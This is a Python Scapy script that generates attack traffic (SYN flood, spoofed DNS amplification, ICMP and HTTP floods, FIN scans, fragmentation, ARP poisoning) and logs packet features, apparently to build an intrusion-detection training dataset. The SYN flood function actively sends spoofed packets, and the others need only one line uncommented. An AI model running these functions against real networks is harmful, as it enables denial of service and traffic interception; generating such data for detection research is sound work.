from scapy.all import *
import random
import csv
import time
from datetime import datetime, timedelta
import numpy as np

# Flow information storage
flow_table = {}

# Target IP
target_ip = "192.168.1.100"

# List of commonly exploited ports
exploited_ports = [
    19, 135, 137, 138, 139, 445, 1433, 1720, 1900, 2323, 4444, 5555, 6666, 6667, 6668, 6669, 11211, 12345, 31337, 54321
]

# Function to generate realistic random MAC address
def random_mac():
    oui = ["00:1A:2B", "00:1B:44", "00:1C:C0", "00:1D:FA", "00:1E:67", "00:1F:29", "00:0A:E6", "00:0B:CD"] # Real OUI prefixes
    return random.choice(oui) + ":%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

# Function to generate realistic random IP address
def random_ip():
    first_octet = random.choice([10, 172, 192])  # Common internal IP ranges
    if first_octet == 10:
        return "10." + ".".join(map(str, (random.randint(0, 255) for _ in range(3))))
    elif first_octet == 172:
        return "172." + str(random.randint(16, 31)) + "." + ".".join(map(str, (random.randint(0, 255) for _ in range(2))))
    else:
        return "192.168." + ".".join(map(str, (random.randint(0, 255) for _ in range(2))))

# Function to generate variable TTL, Window Size, and Payload
def random_ttl():
    return random.choice([32, 64, 128, 255])

def random_window():
    return random.choice([1024, 2048, 4096, 8192, 16384, 32768, 65535])

def random_payload():
    size = random.randint(20, 1400)  # Generate random payload sizes between 20 and 1400 bytes
    return bytes(random.getrandbits(8) for _ in range(size))

# Function to calculate the payload size of a packet
def calculate_payload_size(packet):
    if packet.haslayer(TCP):
        return len(packet[TCP].payload)
    elif packet.haslayer(UDP):
        return len(packet[UDP].payload)
    else:
        return 0

# Store all packets data in a list
packet_records = []

class FlowInfo:
    def __init__(self, first_packet_timestamp, last_packet_timestamp, packet_count, total_payload_size, last_inter_arrival_time):
        self.first_packet_timestamp = first_packet_timestamp
        self.last_packet_timestamp = last_packet_timestamp
        self.packet_count = packet_count
        self.total_payload_size = total_payload_size
        self.last_inter_arrival_time = last_inter_arrival_time

    @property
    def flow_duration(self):
        return (self.last_packet_timestamp - self.first_packet_timestamp).total_seconds() * 1000  # in milliseconds

def update_flow_info(flow_key, timestamp, payload_size):
    if flow_key not in flow_table:
        flow_info = FlowInfo(
            first_packet_timestamp=timestamp,
            last_packet_timestamp=timestamp,
            packet_count=1,
            total_payload_size=payload_size,
            last_inter_arrival_time=timedelta(seconds=0)
        )
        flow_table[flow_key] = flow_info
    else:
        flow_info = flow_table[flow_key]
        inter_arrival_time = timestamp - flow_info.last_packet_timestamp

        if inter_arrival_time.total_seconds() > 0:  # Ensure that time difference is positive
            flow_info.last_inter_arrival_time = inter_arrival_time

        flow_info.last_packet_timestamp = timestamp
        flow_info.packet_count += 1
        flow_info.total_payload_size += payload_size

    return flow_info

def record_packet(packet, attack_type):
    ip_layer = packet.getlayer(IP)
    tcp_layer = packet.getlayer(TCP)
    udp_layer = packet.getlayer(UDP)
    icmp_layer = packet.getlayer(ICMP)
    
    # Generate entropy based on payload content
    payload = bytes(packet[TCP].payload if tcp_layer else packet[UDP].payload if udp_layer else b'')
    entropy = calculate_entropy(payload)

    # Calculate payload size
    payload_size = calculate_payload_size(packet)

    # Formatting timestamp manually
    timestamp = datetime.utcfromtimestamp(packet.time)

    # flow_key = f"{ip_layer.src}:{tcp_layer.sport if tcp_layer else udp_layer.sport}->{ip_layer.dst}:{tcp_layer.dport if tcp_layer else udp_layer.dport}"

    # Debugging: print the flow key to ensure it is consistent
    # print(f"Flow Key: {flow_key}, Timestamp: {timestamp}")

    # flow_info = update_flow_info(flow_key, timestamp, payload_size)

    # Determine the protocol
    if tcp_layer:
        protocol = "Tcp"
    elif udp_layer:
        protocol = "Udp"
    elif icmp_layer:
        protocol = "Icmp"
    else:
        protocol = "Unknown"

    record = {
        # "Timestamp": timestamp.strftime('%Y-%m-%dT%H:%M:%S.%fZ'),
        # "SourceMac": random_mac(),  # Realistic random MAC
        # "DestinationMac": random_mac(),  # Realistic random MAC
        "Protocol": protocol,
        # "SourceIp": ip_layer.src if ip_layer else np.nan,
        # "DestinationIp": ip_layer.dst if ip_layer else np.nan,
        # "SourcePort": tcp_layer.sport if tcp_layer else (udp_layer.sport if udp_layer else np.nan),
        "DestinationPort": tcp_layer.dport if tcp_layer else (udp_layer.dport if udp_layer else np.nan),
        "Length": len(packet),
        "Ttl": ip_layer.ttl if ip_layer else np.nan,
        "SynFlag": tcp_layer.flags.S if tcp_layer and tcp_layer.flags.S else False,
        "AckFlag": tcp_layer.flags.A if tcp_layer and tcp_layer.flags.A else False,
        "FinFlag": tcp_layer.flags.F if tcp_layer and tcp_layer.flags.F else False,
        "RstFlag": tcp_layer.flags.R if tcp_layer and tcp_layer.flags.R else False,
        "WindowSize": tcp_layer.window if tcp_layer else random_window(),
        "PayloadSize": payload_size,
        "Entropy": entropy
        # "PacketsPerFlow": flow_info.packet_count,
        # "InterArrivalTime": flow_info.last_inter_arrival_time.total_seconds() * 1000,  # in milliseconds
        # "FlowDuration": flow_info.flow_duration
    }

    packet_records.append(record)

def calculate_entropy(data):
    from math import log2
    if not data:
        return 0
    entropy = 0
    length = len(data)
    frequency = {}
    for byte in data:
        frequency[byte] = frequency.get(byte, 0) + 1
    for count in frequency.values():
        p = count / length
        entropy -= p * log2(p)
    return entropy

# SYN Flood Attack (keeping the source port and flow key consistent)
# def syn_flood(target_ip, packet_count=100):
#     base_src_port = random.randint(1024, 65535)  # Fixed source port for consistency
#     for _ in range(packet_count):
#         ip = IP(src=random_ip(), dst=target_ip, ttl=random_ttl())
#         tcp = TCP(sport=base_src_port, dport=random.choice(exploited_ports), flags="S", window=random_window())
#         payload = random_payload()
#         packet = ip/tcp/payload
#         record_packet(packet, "SYN Flood")

def syn_flood(target_ip, packet_count=10000):
    for _ in range(packet_count):
        ip = IP(src=random_ip(), dst=target_ip, ttl=random_ttl())
        tcp = TCP(sport=random.randint(1024, 65535), dport=random.choice(exploited_ports), flags="S", window=random_window())
        packet = ip/tcp  # No payload in a typical SYN flood
        send(packet, verbose=False)
        record_packet(packet, "SYN Flood")

# IP Spoofing (keeping the source port and flow key consistent)
# def ip_spoofing(target_ip, packet_count=100):
#     base_src_port = random.randint(1024, 65535)  # Fixed source port for consistency
#     for _ in range(packet_count):
#         ip = IP(src=random_ip(), dst=target_ip, ttl=random_ttl())
#         tcp = TCP(sport=base_src_port, dport=random.choice(exploited_ports), flags="PA", window=random_window())
#         payload = random_payload()
#         packet = ip/tcp/payload
#         record_packet(packet, "IP Spoofing")

def ip_spoofing(target_ip, packet_count=100):
    for _ in range(packet_count):
        ip = IP(src=random_ip(), dst=target_ip, ttl=random_ttl())
        tcp = TCP(sport=random.randint(1024, 65535), dport=random.choice(exploited_ports), flags="S", window=random_window())
        payload = random_payload()
        packet = ip/tcp/payload
        # send(packet, verbose=False)
        record_packet(packet, "IP Spoofing")

# Malformed Packets (keeping the source port and flow key consistent)
# def malformed_packets(target_ip, packet_count=100):
#     base_src_port = random.randint(1024, 65535)  # Fixed source port for consistency
#     for _ in range(packet_count):
#         ip = IP(dst=target_ip, ihl=random.randint(0, 5), ttl=random_ttl())
#         tcp = TCP(sport=base_src_port, dport=random.choice(exploited_ports), flags="FPU", window=random_window())
#         payload = random_payload()
#         packet = ip/tcp/payload
#         record_packet(packet, "Malformed Packet")

def malformed_packets(target_ip, packet_count=100):
    for _ in range(packet_count):
        ip = IP(dst=target_ip, ihl=random.choice([5, 6, 7, 8]), ttl=random_ttl())  # Slightly malformed IHL
        tcp = TCP(sport=random.randint(1024, 65535), dport=random.choice(exploited_ports), flags="FPU", window=random_window())
        payload = random_payload()
        packet = ip/tcp/payload
        # send(packet, verbose=False)
        record_packet(packet, "Malformed Packet")

# DNS Amplification Attack (keeping the source IP and flow key consistent)
# def dns_amplification(target_ip, packet_count=50):
#     base_src_ip = random_ip()  # Fixed source IP for consistency
#     for _ in range(packet_count):
#         ip = IP(src=base_src_ip, dst="8.8.8.8", ttl=random_ttl())  # Spoofed IP, targeting Google DNS
#         udp = UDP(sport=random.randint(1024, 65535), dport=53)
#         dns = DNS(rd=1, qd=DNSQR(qname="example.com"))
#         payload = random_payload()
#         packet = ip/udp/dns/payload
#         record_packet(packet, "DNS Amplification")

def dns_amplification(target_ip, packet_count=50):
    for _ in range(packet_count):
        ip = IP(src=target_ip, dst="8.8.8.8", ttl=random_ttl())  # Spoofed source IP
        udp = UDP(sport=random.randint(1024, 65535), dport=53)
        dns = DNS(rd=1, qd=DNSQR(qname="example.com"))  # Query that returns a large response
        packet = ip/udp/dns
        # send(packet, verbose=False)
        record_packet(packet, "DNS Amplification")

# ICMP Flood (Ping Flood, keeping the source IP and flow key consistent)
# def icmp_flood(target_ip, packet_count=100):
#     base_src_ip = random_ip()  # Fixed source IP for consistency
#     for _ in range(packet_count):
#         ip = IP(src=base_src_ip, dst=target_ip, ttl=random_ttl())  # Removed the parentheses here
#         icmp = ICMP()
#         udp = UDP(sport=random.randint(1024, 65535), dport=53)
#         payload = random_payload()
#         packet = ip/icmp/udp/payload
#         record_packet(packet, "ICMP Flood")

def icmp_flood(target_ip, packet_count=100):
    for _ in range(packet_count):
        ip = IP(src=random_ip(), dst=target_ip, ttl=random_ttl())
        icmp = ICMP()
        packet = ip/icmp
        # send(packet, verbose=False)
        record_packet(packet, "ICMP Flood")

# HTTP Flood Attack (simulated by sending GET requests to a target web server)
def http_flood(target_ip, packet_count=100):
    for _ in range(packet_count):
        ip = IP(src=random_ip(), dst=target_ip, ttl=random_ttl())
        tcp = TCP(sport=random.randint(1024, 65535), dport=80, flags="PA", window=random_window())
        payload = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip).encode()
        packet = ip/tcp/payload
        # send(packet, verbose=False)
        record_packet(packet, "HTTP Flood")

# TCP FIN Scan (stealth scan using FIN packets)
def tcp_fin_scan(target_ip, start_port=1, end_port=1024):
    for port in range(start_port, end_port + 1):
        ip = IP(src=random_ip(), dst=target_ip, ttl=random_ttl())
        tcp = TCP(sport=random.randint(1024, 65535), dport=port, flags="F", window=random_window())
        packet = ip/tcp
        # send(packet, verbose=False)
        record_packet(packet, "TCP FIN Scan")

# Fragmentation Attack (sending fragmented packets)
def fragmentation_attack(target_ip, packet_count=100):
    for _ in range(packet_count):
        ip = IP(src=random_ip(), dst=target_ip, ttl=random_ttl(), flags="MF")
        tcp = TCP(sport=random.randint(1024, 65535), dport=random.choice(exploited_ports), flags="PA", window=random_window())
        payload = random_payload()
        packet = ip/tcp/payload
        fragments = fragment(packet, fragsize=8)
        for frag in fragments:
            # send(frag, verbose=False)
            record_packet(frag, "Fragmentation Attack")

# ARP Poisoning Attack (simulated, as true ARP poisoning requires active network manipulation)
def arp_poisoning(target_ip, gateway_ip, packet_count=14000):
    target_mac = random_mac()
    gateway_mac = random_mac()

    for _ in range(packet_count):
        # ARP response to target, claiming to be the gateway
        arp_response_to_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        # ARP response to gateway, claiming to be the target
        arp_response_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)

        # Record both packets to simulate ongoing ARP poisoning
        record_packet(arp_response_to_target, "ARP Poisoning")
        record_packet(arp_response_to_gateway, "ARP Poisoning")



# Execute different types of malicious traffic generation and save to csv
if __name__ == "__main__":
    print("Starting malicious traffic generation...")

    syn_flood(target_ip, packet_count=10) # tcp
    # ip_spoofing(target_ip, packet_count=16000) # tcp
    # malformed_packets(target_ip, packet_count=16000) # tcp
    # dns_amplification(target_ip, packet_count=16000) # udp
    # icmp_flood(target_ip, packet_count=16000) # icmp

    # http_flood(target_ip, packet_count=16000) # tcp
    # tcp_fin_scan(target_ip, start_port=1, end_port=1023) # tcp
    # tcp_fin_scan(target_ip, start_port=1024, end_port=2048) # tcp
    # fragmentation_attack(target_ip, packet_count=300) # unknown (x10 size)
    # arp_poisoning(target_ip, gateway_ip="192.168.1.1") # unknown

    print(f"Number of records generated: {len(packet_records)}")
    print("Traffic generation completed. Preparing to write CSV...")

    # Save records to a csv file
    # csv_file = "E:\Stuff\IDS Machine Learning\Source\Tools\malicious_traffic2.csv"
    # with open(csv_file, mode='w', newline='') as file:
    #     writer = csv.DictWriter(file, fieldnames=packet_records[0].keys())
    #     writer.writeheader()
    #     writer.writerows(packet_records)

    # print(f"CSV file written successfully to {os.path.abspath(csv_file)}.")
